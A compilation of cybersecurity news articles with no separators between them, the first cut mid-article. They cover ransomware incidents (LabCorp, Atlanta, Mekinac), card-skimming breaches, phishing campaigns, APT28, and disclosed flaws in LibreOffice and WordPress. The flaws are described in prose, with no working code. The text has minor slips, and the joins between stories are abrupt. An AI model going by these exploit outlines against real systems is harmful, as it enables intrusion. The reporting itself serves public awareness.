It isn't clear if the company has a timeline for these changes, or if two-factor authentication was already in place at the time of the attack. Salted Hash has reached out to LabCorp for additional comment and will update should they respond. 
However, because LabCorp was able to detect and respond to the attack quickly, they likely saved themselves from costly and lengthy outages. It's also likely that backups (tested and current) played a large role in the recovery phase of the incident.
The last time the Samsam group was in the news, they had attacked the Colorado Department of Transportation twice in two weeks and the City of Atlanta.
In March, based on the current value of Bitcoin at the time, it was estimated that the group had earned nearly $850,000 USD from their victims, who paid the ransom demands.

Hacking has long been thought of as a sort of black magic whose incantations are made using keyboards. That is, until 2016, when the John Podesta email hack made big enough news that hackers’ dirty secret got out: many breaches have less to do with coding skills and much more to do with classic trickery, albeit in digital form. Web users simply get duped into entering their username and passwords onto fake websites. With that information, it doesn’t take any special cleverness to hack a system. The attacker has the keys.
The chief tool hackers use to lure unsuspecting people to these phony websites is email. When the victim works at a company of some kind, those credentials might provide cyber-criminals with access to more than just email. The same credentials might also provide access to intranets, servers and sensitive data. Executives are looking hard for ways to protect their operations today without cramping employee productivity.
One method many might be looking at is virtual machines, workspaces that run software on the cloud but looks to the user just like a normal desktop. As counter-measures go, muckraking news outlet The Intercept has sung its praises. As it happens, Amazon Web Services announced a new offer on its blog Thursday—40 hours of virtual machinery free to users and companies that might want to try it out. Windows 7 and Windows 10 experiences are available.
Working inside a window into the cloud protects physical devices from evil code a user might get tricked into initializing. Called WorkSpaces, it can give staff access to all of a company’s data and tools from anywhere.
If an employee is working from home and gets hit by ransomware, it encrypts everything on the hard drive and demands payment in bitcoin to set data free. If the ransomware got run on the employee’s actual machine, all the music, photos and personal documents stored there would be locked up too. On a virtual machine, though, only the virtual device gets hit. All that personal data stays safe.

If a user clicks on a link in a malicious email and accepts a prompt to enter their user name and password on a phony website, there is nothing about a virtual machine that will prevent that information from getting lost. That’s why it’s good for companies to have more robust sign-ons, such as using two-factor authentication.
More sophisticated hackers might try to get specific credentials for high level employees in order to impersonate them digitally. For example, an attacker could send an email from an executive’s email address, Jakobsson explained, directing bookkeepers to wire money to a specific account for phony services, Jakobsson explained. The FBI has estimated that such scams have cost companies $5 billion over the last few years.
A virtual machine can’t prevent that trick.
Carbon Black delivers security services over the crowd, spotting attacks and detecting intruders. “The majority of leading cybersecurity researchers are not yet ready to give all the power to the machines just yet,” Rick McElroy, a security strategist there wrote the Observer, via a spokesperson. “User awareness and education continue to major best practices when it comes to defending against phishing attacks. Computers will help, but not yet replace, human decision making.”
Desktop-as-a-service systems like WorkSpaces can turn clunky computers into lean, mean, totally updated machines. They might even be digital Sir Lancelot’s, protecting companies’ IT castles well, but one knight won’t be enough—firms will still need a full roundtable.

 It's been a week since hackers launched a ransomware attack against the city of Atlanta, and local officials are still grappling with its effects.
""We are dealing with a hostage situation,"" Atlanta Mayor Keisha Lance Bottoms said in a statement.
On Thursday, municipal courts were closed again and residents were unable to pay their traffic tickets or water bills online. In some cases, employees had to fill out urgent forms and reports by hand, CNN reported. 
The city allowed its employees to turn on their work computers and printers for the first time on Wednesday, although officials warned that some computers may still be affected.
 In a ransomware attack, hackers place malware on a computer — or system of computers — that restricts access, and then demand payment to undo it.
The culprits have demanded the city of Atlanta pay them $51,000 in bitcoin to unlock the government's encrypted systems. Bottoms would not say whether the city would meet their request.
Atlanta officials — along with local law enforcement, the FBI, the Department of Homeland Security, and Secret Service — are said to be working round-the-clock on the matter to investigate whether any government data or anybody's personal information was compromised.
An information portal has been set up on the city government's website to keep residents and employees updated on the latest developments of the hack.
Officials from Atlanta Information Management, the city's technology department, realized the city had been attacked on March 22. 
 As a result, officials said, ""some city data is encrypted and customers are not able to access city applications."" This has mostly prevented people from using online applications to pay bills and access court-related information.
Although Atlanta officials have not yet identified those behind the attack, an Atlanta-based security firm called Dell SecureWorks, which is helping the city investigate the attack, pointed to a group called SamSam, according to The New York Times.
It is not clear who is part of the group or where it is based.
On Monday, Mayor Bottoms held a news conference to reassure the public that the city was doing everything in its power to restore its systems, but cautioned people against taking the matter lightly.
""I just want to make the point that this is much bigger than a ransomware attack,"" Bottoms said. ""This is really an attack on our government, which means it's an attack on all of us.""

GREENVILLE, NC (WITN) - A dozen Eastern Carolina hotels are among the 1200 locations that were victims of a lengthy cyber attack last year.
InterContinental Hotels Group says customer credit card information was stolen from franchised locations that include Holiday Inn, Holiday Inn Express, Candlewood Suites and Staybridge Suites.
The hacking began on September 29th and continued at some locations for three months.
Hackers used malware that searched for track data stored on magnetic stripes, which includes name, card number, expiration date and internal verification code, the company said.
Those hotels in Eastern Carolina affected, and the dates of hacking were:
Greenville - Holiday Inn at 203 Greenville Boulevard.  Hacked from September 29 to December 29.Havelock - Holiday Inn Express.  Hacked from September 29 to December 1.Jacksonville - Staybridge Suites on Cobia Court.  Hacked from September 29 to December 29.Morehead City - Holiday Inn Express.

TORONTO, April 19 (Reuters) - Global hotel chain InterContinental Hotels Group Plc said 1,200 of its franchised hotels in the United States, including Holiday Inn and Crowne Plaza, were victims of a three-month cyber attack that sought to steal customer payment card data.
The company declined to say how many payment cards were stolen in the attack, the latest in a hacking spree on prominent hospitality companies including Hyatt Hotels Corp, Hilton, and Starwood Hotels, now owned by Marriott International Inc.
The breach lasted from September 29 to December 29, InterContinental spokesman Neil Hirsch said on Wednesday. He declined to say if losses were covered by insurance or what financial impact the hacking might have on the hotels that were compromised, which also included Hotel Indigo, Candlewood Suites and Staybridge Suites properties.
The malware searched for track data stored on magnetic stripes, which includes name, card number, expiration date and internal verification code, the company said.
Hotel operators have become popular targets because they are easier to breach than other businesses that store credit card numbers as they have limited knowledge in defending themselves against hackers, said Itay Glick, chief executive of Israeli cyber-security company Votiro. ""They don't have massive data centers like banks which have very secure systems to protect themselves,"" said Glick.
InterContinental declined to say how many franchised properties it has in the United States, which is part of its business unit in the Americas with 3,633 such properties.
In February, InterContinental said it had been victim of a cyber attack, but at that time said that only 12 of its 286 managed properties in the Americas were infected with malware.

JEDDAH – Industry sources revealed that some 5 to 10 public and private organizations have been impacted by the second Shamoon virus attack, a aggressive disk-wiping malware, on Monday.
According to research, the group uses a custom information-stealing remote access Trojan (RAT) known as Trojan.Ismdoor as well as a selection of hacking tools to steal sensitive credentials from compromised organizations.
As threats arise, CEOs and organization leaders in the region will revamp and boost their cyber security strategies, according to Charles Habak head of financial services at Booz Allen Hamilton who predicted digital bank trends for 2017.

It is – or it should be – a well known fact that attackers occasionally email potential victims with PDF attachments containing malware or exploit code.
But the latest attacks through PDF attachments are geared towards pushing users to enter their email account credentials into well-crafted phishing pages.
Microsoft security experts saw a lot of variants of the same attack, and they all start with spoofed emails supposedly delivering asked-for documents.
In one variation, the PDF makes it look like there has been an error, and the document can only be displayed with Microsoft Excel.
But instead of actually opening it with their own software, potential victims are urged to open it by following the link offered in the PDF:
If they do that, they will be redirected to a web page that makes it seem like the document can only be opened if the user signs in with their email credentials.
In another variant, the PDF urges users to click on a link that will supposedly allow them to view a Dropbox-hosted document online.
“Social engineering attacks are designed to take advantage of possible lapses in decision-making.
Awareness is key; that is why we’re making these cybercriminal tactics known,” Microsoft’s Alden Pornasdoro explained.
“In these times, when we’re seeing heightened phishing attacks with improved social engineering techniques, a little bit of paranoia doesn’t hurt.
For instance, question why Adobe Reader is trying to open an Excel file.

 (CNN)Atlanta's mayor on Thursday urged anyone with personal information in city information systems to check their financial records as an investigation continues into a ransomware attack on the city.
Ransomware is a malicious software that prevents or limits users from accessing their system by locking them out until a ransom is paid. NBC affiliate WXIA reported that the city received a ransom demand in bitcoin for $6,800 per unit or $51,000 to unlock the entire system. CNN has not independently confirmed the report.
Mayor Keisha Lance Bottoms advised city employees to contact credit agencies and monitor their bank accounts in case their personal data was compromised. She urged the public to take the same precautions while investigators work to determine the scope of the attack.
""We don't know the extent so we just ask that you be vigilant,"" Bottoms said in a Thursday news conference. ""All of us are subject to this attack, if you will. Many of us pay our bills online, we have direct deposit, so go online and check your bank statements."" 
Atlanta Chief Operating Officer Richard Cox confirmed that the city received a written demand related to the attack. When asked in the news conference if the city was going to pay a ransom, Bottoms said, ""We can't speak to that right now.""
""We will be looking for guidance from, specifically, our federal partners on how to best navigate the best course of action,"" she said.
The Federal Bureau of Investigation and Department of Homeland Security are investigating the cyberattack, which Atlanta Information Management officials learned of Thursday at 5:40 a.m., Cox said. DHS spokesman Scott McConnell said the agency offered technical expertise and support and referred questions to the city.
The city announced outages earlier Thursday to various customer-facing applications, including those used to pay bills and access court-related information.
Thursday afternoon, Cox said several departments were affected, too. Some city data remains encrypted while investigators continue to determine the scope of the attack, he said.
The city's payroll has not been affected, he said. Public safety and water services are operating without incident.
The city engaged Microsoft and a team from Cisco's Incident Response Services in the investigation, Deputy Chief Information Officer Daphne Rackley said.
When asked if the city was aware of vulnerabilities and failed to take action, Rackley said the city had implemented measures in the past that might have lessened the scope of the breach. She cited a ""cloud strategy"" to migrate critical systems to secure infrastructure.
""This is not a new issue to the state of Georgia, it's not a new issue to our country. We have been taking active measures to mitigate any risk in the past.""
In the meantime, the mayor urged caution.
""We don't know if it's limited to information related to just our employees or if it's more extensive than that. But because we don't know I think that it would be appropriate for the public just to be vigilant in checking their accounts and making sure your credit agencies also have been notified.""

A security flaw affecting LibreOffice and Apache OpenOffice has been fixed in one of the two open-source office suites. The other still appears to be vulnerable.
Before attempting to guess which app has yet to be patched, consider that Apache OpenOffice for years has struggled attract more contributors. And though the number of people adding code to the project has grown since last we checked, the project missed its recent January report to the Apache Foundation. The upshot is: security holes aren't being patched, it seems.
The issue, identified by security researcher Alex Inführ, is that there's a way to achieve remote code execution by triggering an event embedded in an ODT (OpenDocument Text) file.
In a blog post on Friday, Inführ explains how he found a way to abuse the OpenDocument scripting framework by adding an onmouseover event to a link in an ODT file.
The event, which fires when a user's mouse pointer moves over the link, can traverse local directories and execute a local Python script.
After trying various approaches to exploit the vulnerability, Inführ found that he could rig the event to call a specific function within a Python file included with the Python interpreter that ships with LibreOffice.
""For the solution I looked into the Python parsing code a little more in depth and discovered that it is not only possible to specify the function you want to call inside a python script, but it is possible to pass parameters as well,"" he said.
The exploit was tested on Windows, and should work on Linux, too.
Inführ says he reported the bug on October 18 and it was fixed in LibreOffice by the end of the month. RedHat assigned it CVE-2018-16858 in mid-November and gave Inführ a disclosure date of January 31, 2019.
When he published on February 1, in conjunction with the LibreOffice fix notification, OpenOffice still had not been patched. Inführ says he reconfirmed that he could go ahead with disclosure even though OpenOffice 4.16 has yet to be fixed.
His proof-of-concept exploit doesn't work with OpenOffice out-of-the-box because the software doesn't allow parameters to be passed in the same way as the unpatched version of LibreOffice did. However, he says that the path traversal issue can still be abused to execute a local Python file and cause further mischief and damage.
We're imagining specifically targeted netizens being tricked into opening a ZIP file, unpacking an ODT and Python script, and then the ODT document attempting to execute the Python script when the victim rolls their mouse over a link, for instance.
The Register tried to reach two OpenOffice contributors to find out what's going on. We've not heard back.
According to Inführ, OpenOffice users can mitigate the risk by removing or renaming the pythonscript.py file in the installation folder.

The email or letter looks official, and it contains an attention-grabbing message: The state is holding on to your unclaimed property, which may be worth hundreds of thousands of dollars. All you have to do is pay a fee upfront or provide your personal information and the money is yours.
But the letters and emails are the work of scammers, not state officials. A growing number of people across the country are receiving these messages and some are falling for them, losing thousands of dollars or becoming victims of identity theft in the process.
“These scams are just rampant,” said David Milby, director of the National Association of Unclaimed Property Administrators (NAUPA), which represents state unclaimed property programs. “The email from the public we’ve been getting about this has increased tenfold in the past year.”
Some scammers pretend they work for NAUPA and have even used its letterhead to make their pitch.
Besides costing victims money, consumer advocates say this kind of fraud diminishes public trust in state agencies that handle unclaimed property and makes it harder for them to do their jobs.
Unclaimed property is cash or other financial assets considered lost or abandoned when an owner can’t be found after a certain period of time. It includes dormant savings accounts and CDs, life insurance payments, death benefits, uncashed utility dividends and the contents of abandoned safe deposit boxes.
There is plenty of it. In 2015, unclaimed property agencies in the U.S. collected $7.8 billion and returned $3.2 billion to rightful owners, according to NAUPA. At last count in 2013, states were holding on to $43 billion in unclaimed property.
The treasurer, comptroller or auditor of each state maintains a list of abandoned property and runs an online database that anyone can search by name for free. Forty states and the District of Columbia also provide that information to a NAUPA-endorsed national website that the public can search.
But fraudsters don’t bother reviewing or collecting that data. They simply contact people at random, using email, letters or phone calls, hoping to snare a victim.
The scams play on the idea that people are simply getting back assets they’re owed.
“There’s an air of legitimacy to them,” said John Breyault, a vice president at the National Consumers League. “People think it’s their money.”

Qatar is set to host the 2022 FIFA Soccer World Cup, and to do so, the country must build a number of stadiums.
Additionally, Qatar's economy is also in full bloom, and many companies taking advantage of local tax-free zones are also driving a real-estate boom, with tens of buildings being built every year.
At the heart of Qatar's roaring constructions sector are migrant workers, usually from East-Asian countries, such as India, Bangladesh, and most often Nepal.
Loopholes in local legislation allow employers to withhold passports and force employees to work under appalling conditions, facing steep penalties, and even jail time if they try to leave the country before their contract expires.
These conditions have attracted the attention of many activists, organizations, and journalists, that have published damning reports, even going as far as asking FIFA to revoke the rights to hold the 2022 World Cup until Qatar revises its labour laws.
Claudio Guarnieri, a security researcher working for Amnesty International, has published a report today that reveals how an unknown person or group has created a fake persona named Saleena Malik, which they used to get close to journalists and activists.
The primary goal was to become friends with potential victims, and after months of having private conversations, lure the target into accessing a phishing page disguised as a Google login, and collect their credentials.
Malik's phishing attacks didn't happen right away, but always after the victim had time to get acquainted with her fake persona.
In most cases, Malik posed as a person with similar interests in activism and Qatar's migrant labor laws.
After months of private conversations via email, LinkedIn and/or Facebook, Malik would eventually invite a target to access a document or connect via Google Hangouts.
In all cases, before accessing Malik's documents or Google Hangouts, the victim would first be prompted by a fake login page that collected their credentials.
Guarnieri, who was alerted to Malik's actions by one of the targeted journalists, was able to identify where these phishing pages were hosted and where they sent data for storage.
This is how the researcher tracked down at least 30 other victims of Malik's expert phishing attacks.
Additionally, with collaboration from victims, Guarneri was also able to discover that the people behind the Malik persona had also accessed some of the phished Gmail accounts.
The intruder's IP address belonged to a local Qatar Internet service provider.
What the researchers wasn't able to find was who was behind the attacks.
His guesses include the government of Qatar, another government wanting to make Qatar look bad, or a contractor hired by one of the construction firms or a government agency.
In a statement for Amnesty International, a spokesperson for the government of Qatar denied any involvement.
These particular set of attacks show a deep knowledge of social engineering, and especially phishing tactics.
Whoever was behind this campaign had both the knowledge, skills and patience to wait for the seeds he planted to bear fruits many months later.

A compelling and potentially very successful email spam campaign is being leveraged against UK residents, warns Sophos researcher Paul Ducklin.
The email addresses the recipients by their first name, the name of the attached file is their last name, and the email body contains their exact address.
Add to this the claim that the sender has received a significant amount of personal information about the recipient and that this info was likely stolen in a hack, and one can see why many could be persuaded to download the attached file.
In this particular case, the grammar and spelling mistakes in the email body do not play a factor, as it’s possible that a well-meaning sender of such a warning is not a native English speaker.
If the recipient downloads and opens the attached Word file, he or she will be prompted to enter the password provided in the email, and to enable macros in order to view the document’s contents.
Unfortunately, this action allows the file to run a malicious macro program bundled in the file, and it will download what seems to be a GIF file.
It is not: it contains an executable file – a Trojan that turns the victim’s file into a bot, and ropes it into a botnet.
As Ducklin noted, the malware included in the file can be easily changed, or the the current bot can download additional malware if so instructed by the attackers.
Some could (understandably) be worried about the fact that someone out there has much personal info about them, but if they are, it’s best to involve local law enforcement and ask for advice.

Researchers at security vendor Check Point have warned of a ransomware attack targeting HR departments.
This attack is currently targeted at German speaking companies and pretends to be a job application.
Researchers say that the email comes with two attachments.
A covering letter which is a standard PDF and an Excel file containing the GoldenEye variant of the Petya ransomware.
According to the blog, when the user opens the Excel file: “It contains a picture of a flower with the word “Loading…” underneath, and a text in German asking the victim to enable content so that the macros can run”.
Once enabled the macros begin encrypting the local user files before displaying the ransom note: “YOUR_FILES_ARE_ENCRYPTED.TXT”
The computer is then rebooted and GoldenEye begins encrypting the entire hard disk.
Eventually the user is presented with a message telling them they are infected with the GoldenEye ransomware.
They are asked to download the Tor Browser and pay a ransom of at least 1.3 Bitcoin (BTC).
The surge in value for Bitcoin at the end of 2016 has driven the price up.
As of today the price of a single Bitcoin is $1,148 meaning that unlocking the computer will cost the user almost $1,500.
Interestingly the researchers believe that the malware owner is trying to get around $1,000 per victim.
This means that with the fluctuation in the price of BTC they will have to keep adjusting their ransom demands.

Polish security expert Dawid Golunski has discovered a zero-day in the WordPress password reset mechanism that would allow an attacker to obtain the password reset link, under certain circumstances.
The researcher published his findings yesterday, after reporting the flaw to the WordPress security team last July.
After more than ten months and no progress, Golunski decided to go public and inform WordPress site owners of this issue so they could protect their sites by other means.
The issue, tracked via the CVE-2017-8295 identifier, affects all WordPress versions and is related to how WordPress sites put together the password reset emails.
According to Golunski, an attacker can craft a malicious HTTP request that triggers a tainted password reset operation by injecting a custom SERVER_NAME variable, such as ""attacker-domain.com"".
This means that when the WordPress site puts together the password reset email, the ""From"" and ""Return-Path"" values will be in the form of ""wordpress@attacker-domain.com"".
Most users would think this zero-day is useless, as the attacker wouldn't achieve anything more than sending a password reset email to the legitimate site owner, but from the wrong Sender address.
These complex exploitation scenarios are most likely the main reason why the WordPress team has not prioritized patching this issue until now. The same opinion is shared by security experts from Sucuri, a vendor of web-based security products, recently acquired by GoDaddy.
""The vulnerability exists, but is not as critical as advertised for several reasons,"" said Sucuri vulnerability researcher Marc Montpas. ""The whole attack relies on the fact that the victim's email is not accessible at the time the attack is occurring, which greatly reduces the chance of a successful attack.""
His colleague, Denis Sinegubko, also shared his thoughts on the issue. ""After a brief reading and assuming the attack works, it has limited impact as it requires an individual site to be accessible by IP address, so will not work for most sites on shared servers. Only for poorly configured dedicated servers.""
""The whole attack scenario is theoretically possible but in practice, I don't see thousands of sites getting hacked because of this vulnerability any time soon,"" Montpas added.
But if some users are not willing to take risks, webmasters managing high-value sites looking for a way to prevent exploitation of this zero-day have some options at their dispossable.
""As a temporary solution users can enable UseCanonicalName to enforce [a] static SERVER_NAME value,"" Golunski proposes.
On Reddit, other users also recommended that site owners ""create a dummy vhost that catches all requests with unrecognized Host headers.""
Depending on your technical prowess, you can also experiment with other mitigations discussed in this Reddit thread, at least until the WordPress team patches this issue.

 The leading cybercrime trend this year is botnets powered by compromised Internet-of-Things (IoT) devices according to the new report by cyber threat intelligence provider SurfWatch Labs.
In 2016, the amount of data collected on service interruption rose 162% over the year prior due to cybercriminals’ use of massive distributed-denial-of-service (DDoS) attacks against a popular security blog as well as hosting and domain name providers.
Cybercrime incidents via the supply chain also spiked sharply this year.
Threat data collected and evaluated by SurfWatch Labs shows that the percentage of cybercrime linked to third parties nearly doubled over the past year – and that only includes publicly disclosed breaches.
“The large-scale attacks we’ve seen this year highlight the ability of cybercriminals to continuously shift their tactics to weak links in the security chain,” said Adam Meyer, chief security strategist, SurfWatch Labs.
“Organizations’ cyber risks have increased due to the growing number of vulnerable devices, easy-to-guess and/or reused user credentials and supply chain cybersecurity weaknesses.

MONTREAL—On Sept 10, municipal employees in a region between Montreal and Quebec City arrived at work to discover a threatening message on their computers notifying them they were locked out of all their files.
In order to regain access to its data, the regional municipality of Mekinac was told to deposit eight units of the digital currency Bitcoin into a bank account — roughly equivalent to $65,000.
Mekinac’s IT department eventually negotiated the cyber extortionists down and paid $30,000 in Bitcoin, but not before the region’s servers were disabled for about two weeks.
The attack highlights the inability of many small municipalities to adequately protect their data, but also the lack of guidance on cybersecurity provided to them by the Quebec government, according to Prof. Jose Fernandez, a malware expert at Montreal’s Polytechnique engineering school.
“Quebec is an embarrassment,” Fernandez said in an interview, adding that he has tried without success to contact government representatives to alert them to the problem.
“There hasn’t been any traction on this issue in the past 15 years,” he said. “I try to speak to (the government) but there is nobody. Who are you going to call? Nobody.” 
Bernard Thompson, reeve for the Mekinac regional municipality, said the ransom demand presented a real dilemma for his small organization. Mekinac groups together 10 municipalities with a population of roughly 13,000 people.
“It was hard, clearly, on the moral side of things that we had to pay a bunch of bandits,” Thompson said.
Mekinac’s attackers used malicious software — known as malware or ransomware — to demand money in return for keys to unlock the data.
Fernandez said it is ironic that Quebec is home to a thriving cybersecurity industry and is an emerging hub for artificial-intelligence research, yet the provincial government is “decades” behind other provinces in defending against cyberattacks. 
Still, Quebec is not the only province experiencing attacks. Several municipal governments and businesses in Ontario were recently hit by ransomware attacks, prompting the Ontario Provincial Police to issue an advisory in September.
In response to the growing problem, Communications Security Establishment — the Defence Department’s electronic intelligence agency — launched the Canadian Centre for Cyber Security last month. It is responsible for monitoring “new forms of ransomware” and advising the federal and provincial governments.
Spokesman Evan Koronewski said the centre has no provincial or territorial equivalent.
Fernandez, however, notes that some provinces are taking significant steps. British Columbia and New Brunswick have established offices dedicated to protecting government data. Meanwhile in Quebec, he said, small towns are left unprotected.
“I’m hoping the new government does something about it,” he said.
Patrick Harvey, spokesman for the Public Security Department, disputed the claim the provincial government is unprepared for cyberattacks.
He said the Treasury Department has a director of information responsible for ensuring government data is protected. The Public Security Department has a unit dedicated to responding to cyberattacks within the administration and provincial police.
But municipalities are not part of the unit’s mandate. “Municipalities are autonomous entities that are responsible for ensuring the security of their digital infrastructure,” Harvey said.
Mekinac’s servers were compromised after an employee opened and clicked on a link in a fraudulent email sent by the hackers.
Once opened, the malware was downloaded onto the computer, giving the hackers access to the entire network. The hackers then encrypted all the data and held it hostage until they received their bitcoins.
Once a system’s data is encrypted, it’s virtually impossible to crack the code without a key — and there is nothing police can do about it.
Most professional criminals use commercial grade encryption and to locate a key to decrypt data would take “astronomical effort in terms of computing,” Fernandez said.
“You either pay or you don’t get the data.”
The identity and location of Mekinac’s hackers were never discovered.
Thompson said police seized some of his computers for analysis and told his office not to negotiate or pay the criminals. 
But Thompson said his region couldn’t heed that advice, because it would have meant months of data re-entry, costing significantly more than $30,000.
So they paid, got their data back and learned a valuable lesson.
“In the end, in terms of the security of our system, (the attack) was actually positive,” Thompson said.
A local cybersecurity company — for $10,000 a year — helped the regional municipality build firewalls and encrypt its own data.
“We are practically no longer vulnerable,” Thompson said. “Everything is encrypted now. Every email is analyzed before we even receive it.”
He warns that small towns across the province are just as susceptible to attack as his region was. 
“Every day, our system catches malicious emails trying to penetrate — but they are stopped,” he said. “But the attacks keep coming.”

Kmart has suffered another credit card breach, its second in three years. This time though, its chip-and-PIN card readers significantly contained the fallout.
Kmart is not saying how many of its 750 stores in the US were affected by the point-of-sale (PoS) malware, but it stressed that no personal data, including names, addresses, Social Security Numbers or email addresses, was stolen. It also talked up its EMV reader implementation.
Kmart has EMV-enabled terminals in its stores, forcing customers with chip cards to insert their cards instead of swiping their stripes, which minimized the impact of the infection. Still, as independent researcher Brian Krebs reported, those consumers without chip cards could feel significant effects:
“The malware copies account data stored on the card’s magnetic stripe,” he explained. “Armed with that information, thieves can effectively clone the cards and use them to buy high-priced merchandise from electronics stores and big box retailers.”
Several financial institutions flagged the breach to Krebs, indicating that fraud is indeed occurring as a result of the attack, though again, no details are available as to how widespread the impact is.
The incident has no relation to previous breaches, the bargain retailer said in an FAQ, noting that it’s confident that it was successful in eradicating any residual traces of malware or persistence left behind by earlier attacks. Instead, its payment systems were infected with malware that Kmart says was “undetectable” by its antivirus protections.
“Does this mean that we may be dealing with an entirely new family of malware or methods of infecting POS terminals, or that the solution they were using was unable to detect the threat?” said Richard Henderson, Global Security Strategist, Absolute, via email. “If the former, then it will be absolutely critical for Kmart to get information about this attack to other retailers, antivirus companies and network security appliance vendors so that everyone can both look for indicators of compromise inside their own networks and bolster defenses against this new threat.”
If a hole was simply found in KMart's defenses, it brings up the need for a defense-in-depth approach, he added.
The incident was a passing test for the PCI DSS standard of payment security as well, some said.
""This is another example what cybersecurity experts are saying day by day: no IT systems can stay safe if they hold something valuable,” said Csaba Krasznay, product evangelist at Balabit, in a note. “More than 10 years ago, T.J.Maxx suffered a very similar data breach when approximately 100 million cards data was stolen. That incident helped the drive for credit-card companies to introduce PCI DSS as a mandatory security standard for everyone who manages card data. If Kmart was really able to avoid large scale data leakage, then we can be sure that PCI DSS is mature and useful enough in these circumstances, at this point.""

Last week, we reported about these alarming cryptocurrency scams spreading via Twitter. These weren't your garden-variety spam posts either, but rather, fraudsters were hacking into the verified accounts of celebrities and brands in an attempt to lure unsuspecting victims.
But it looks like these crypto-scammers are moving on and are now targeting other social media platforms, as well. This time, they're gaming Facebook's official sponsored ad system to fool eager people who are looking to make a quick profit. Read on and see what this new scheme is all about. Cybercriminals are relentlessly coming up with new tactics all the time, and it's always good to be aware of their latest schemes.
This new ploy is a classic phishing scam that's meant to steal your personal information like your name, email and credit card numbers.
And similar to other elaborate phishing scams, these cybercriminals created a bunch of fake websites, news articles and ads for that purpose. 
The whole ploy starts with a fake Facebook sponsored ad promoting an easy ""wealth building"" scheme. Accompanying the post is an embedded report that appears to originate from the news site CNBC.
If you take the bait and click through the ad, the ruse gets more obvious. First, the link's web address doesn't belong to any CNBC domain.
However, the fraudsters mimicked the look and feel of the real CNBC site so there's a chance an unsuspecting eye might get duped. But yes sir, the entire news article is completely fraudulent, the fakest of fake news.
Basically, it states that Singapore has officially adopted a certain cryptocurrency and has anointed a firm, dubbed the CashlessPay Group, to market and purchase it. Nevermind that CashlessPay sounds just like another third-rate pyramid scheme, but let's go along for the ride, shall we?
You probably know by now that there are tons of bogus information going on in Facebook at any given time. The social media giant is trying to clean up its act, though.
If you can recall, Facebook banned blockchain and cryptocurrency ads earlier this year but softened its stance by allowing pre-approved cryptocurrency advertisers to post sponsored ads. (Can't resist the revenue, eh?)
But as always, scammers have found a way to exploit this loophole to spread their scams.

Last December the US Intelligence Community (IC) released a report naming APT28, a suspected Russian hacking group, as being linked to numerous cyberattacks designed to influence the outcome of the 2016 presidential election with a mixture of leaks and misinformation.
Highlighting Russian ""malicious cyber activity"" the IC's analysis reported on this ""advanced persistent threat"" by confirming it was likely linked to the county's military or intelligence services.
The hackers go by many names: Fancy Bear, Pawn Storm, Sofacy, Sednit, Tsar Team and more.
The group – after targeting the Democratic National Committee (DNC), the World Anti-Doping Agency (Wada) and the German government – is the focus of a new report from US-based cybersecurity firm FireEye, discussing the key hacking techniques it uses.
""We have observed APT28 rely on four key tactics when attempting to compromise intended targets,"" the report states.
These include the use of spearphishing to deploy exploit kits, the spreading of malware, compromising web-facing servers and creating fake internet addresses.
Some of the tactics are straightforward, but work.
In one hypothetical case, a hacker would craft an exploit document with ""enticing lure content"" and send it to a carefully chosen victim.
Once the document is opened, malware is automatically installed by exploiting a vulnerability in computer software.
According to FireEye, APT28 has exploited a number of known security flaws in the past including previously undiscovered ""zero day"" vulnerabilities in Adobe Flash Player, Java, and Windows.
The hackers then contact targets saying they need to reset passwords, lead the victim to a malicious login page and hijack passwords.
""APT28 employs a suite of malware with features indicative of the group's plans for continued operations, as well as the group's access to resources and skilled developers,"" the report states.
After information is stolen, FireEye explains, the hacking group will often leak it to ""further political narratives"".
These reportedly include the conflict in Syria, Nato, the European Union refugee crisis and the 2016 Olympics and Paralympics athlete doping scandal.
In agreement with the US government, the security firm believes the hacking group conducts its operations ""in support of Russian strategic interests"" and is made up of a ""sophisticated and prolific set of developers and operators"".
This is denied by Russian president, Vladimir Putin.
""The recent activity in the US is but one of many instances of Russian government influence operations conducted in support of strategic political objectives, and it will not be the last,"" the report states.
""As the 2017 elections in Europe approach - most notably in Germany, France, and the Netherlands – we are already seeing the makings of similarly concerted efforts.""
The research paper adds another layer to the already-impressive body of work released by organisations including ThreatConnect, Crowdstrike, SecureWorks and Fidelis Cybersecurity.
The firms, while less open to attributing with utmost certainty, continue to link APT28 with Putin's state.
""We stand by our research that the attack data we were given to analyse mirrors previous attacks of APT28,"" John Bambenek, threat intelligence manager at Fidelis told IBTimes UK.
""The malware and the tactics we can speak with expertise on.
What we cannot answer is what the intent of those actors were and at whose direction they were acting, as we do not have direct intelligence on those subjects nor are we in a position to get them.""
Tom Finney, a counter threat researcher from SecureWorks, said: ""We've been able to link this activity to Russia because of the wider targeting seen in this campaign.
""The majority of the activity appears to focus on Russia's military involvement in eastern Ukraine; for example, the email address targeted by the most phishing attempts (nine) was linked to a spokesperson for the Ukrainian prime minister.
""Other targets included individuals in political, military, and diplomatic positions in former Soviet states, as well as journalists, human rights organisations and regional advocacy groups in Russia.""

The IAAF said in a statement the hacking group known as Fancy Bear, which has been linked by western governments and security experts to a Russian spy agency blamed for some of the cyber operations that marred the 2016 U.S. election, was believed to be behind the attack of medical records in February.
The hack targeted information concerning applications by athletics for Therapeutic Use Exemptions, the IAAF said.
Athletes who had applied for TUEs since 2012 have been contacted and IAAF president, Sebastian Coe, apologized.
”Our first priority is to the athletes who have provided the IAAF with information that they believed would be secure and confidential,” Coe said in the statement.
“They have our sincerest apologies and our total commitment to continue to do everything in our power to remedy the situation”.
TUEs are issued by sports federations and national anti-doping organizations to allow athletes to take certain banned substances for verified medical needs.
The IAAF said that data on athlete TUEs was “collected from a file server and stored on a newly created file”.
“The attack by Fancy Bear, also known as APT28, was detected during a proactive investigation carried out by cyber incident response (CIR) firm Context Information Security,” the IAAF said.
Private security firms and U.S. officials have said Fancy Bear works primarily on behalf of the GRU, Russia’s military intelligence agency.
Fancy Bear could not be immediately reached for comment.
The group and other Russian hackers were behind the cyber attacks during the U.S. presidential election last year that were intended to discredit Democratic candidate Hillary Clinton and help Donald Trump, a Republican, win, according to U.S. intelligence agencies.
It was not known if the information was stolen from the network, the IAAF said, but the incident was “a strong indication of the attackers’ interest and intent, and shows they had access and means to obtain content from this file at will”.
The attack was uncovered after British company Context Information Security conducted a investigation of the IAAF’s systems at the request of the athletics body.
Context Information Security said in a separate statement that it was a “sophisticated intrusion” and that “the IAAF have understood the importance and impact of the attack and have provided us comprehensive assistance”.
Last year, Fancy Bear hacked into the World Anti-Doping Agency (WADA) database and published the confidential medical records of several dozen athletes.
Those included cyclist Bradley Wiggins, the 2012 Tour de France winner and Britain’s most decorated Olympian with eight medals, who was revealed to have used TUEs before some races.
